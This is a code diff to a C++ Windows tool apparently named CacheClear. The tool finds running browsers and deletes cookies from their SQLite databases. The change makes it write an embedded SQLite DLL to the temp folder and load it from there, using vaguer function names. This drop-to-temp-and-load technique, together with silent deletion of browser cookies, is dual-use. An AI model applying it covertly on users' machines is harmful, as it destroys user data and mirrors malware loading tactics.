@@ -1,4 +1,6 @@
 #include "../Header/CacheClear.hpp"
+#include "../Header/Resource.h"
+
 #include <windows.h>
 #include <iostream>
 #include <string>
@@ -25,10 +27,52 @@ sqlite3_errmsg_ptr sqlite3_errmsg = nullptr;
 sqlite3_exec_ptr sqlite3_exec = nullptr;
 sqlite3_free_ptr sqlite3_free = nullptr;
 
-bool LoadSQLiteFunctions() {
-    HMODULE hDLL = LoadLibraryA("SQL3.dll");
+bool Load() {
+    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_SQLITE_DLL), RT_RCDATA);
+    if (!hResource) {
+        std::cerr << "Failed to find SQLite DLL resource" << std::endl;
+        return false;
+    }
+
+    HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
+    if (!hLoadedResource) {
+        std::cerr << "Failed to load SQLite DLL resource" << std::endl;
+        return false;
+    }
+
+    DWORD dwResourceSize = SizeofResource(NULL, hResource);
+    void* pResourceData = LockResource(hLoadedResource);
+    if (!pResourceData) {
+        std::cerr << "Failed to lock SQLite DLL resource" << std::endl;
+        return false;
+    }
+
+    std::string tempPath = fs::temp_directory_path().string() + "\\SQL3.dll";
+    std::wstring wtempPath(tempPath.begin(), tempPath.end());
+
+    DeleteFileW(wtempPath.c_str());
+
+    HANDLE hFile = CreateFileW(wtempPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        DWORD error = GetLastError();
+        std::cerr << "Failed to create temp for SQL, error code: " << error << std::endl;
+        return false;
+    }
+
+    DWORD dwWritten;
+    if (!WriteFile(hFile, pResourceData, dwResourceSize, &dwWritten, NULL) || dwWritten != dwResourceSize) {
+        std::cerr << "Failed to write SQL to temp file" << std::endl;
+        CloseHandle(hFile);
+        DeleteFileW(wtempPath.c_str());
+        return false;
+    }
+    CloseHandle(hFile);
+
+    HMODULE hDLL = LoadLibraryW(wtempPath.c_str());
     if (!hDLL) {
-        std::cerr << "Failed to load SQLite DLL" << std::endl;
+        DWORD error = GetLastError();
+        std::cerr << "Failed to load SQL DLL from temp file, error code: " << error << std::endl;
+        DeleteFileW(wtempPath.c_str());
         return false;
     }
 
@@ -41,10 +85,15 @@ bool LoadSQLiteFunctions() {
     if (!sqlite3_open || !sqlite3_close || !sqlite3_errmsg || !sqlite3_exec || !sqlite3_free) {
         std::cerr << "Failed to get SQLite function addresses" << std::endl;
         FreeLibrary(hDLL);
+        DeleteFileW(wtempPath.c_str());
         return false;
     }
 
     return true;
+}
+
+bool LoadSQLFunc() {
+    return Load();
 }
 
 std::vector<std::string> popularBrowsers = {
@@ -79,7 +128,7 @@ std::map<std::string, std::vector<std::string>> browserCookiePaths = {
 };
 
 bool ClearCookiesFromDb(const std::string& cookieDbPath) {
-    if (!LoadSQLiteFunctions()) {
+    if (!LoadSQLFunc()) {
         return false;
     }
 
@@ -174,7 +223,6 @@ void CacheClear() {
             } while (Process32Next(hProcessSnap, &pe32));
         }
         CloseHandle(hProcessSnap);
-
         std::vector<std::string> cookiePaths = browserCookiePaths[runningBrowser];
         for (const auto& path : cookiePaths) {
             char expandedPath[MAX_PATH];
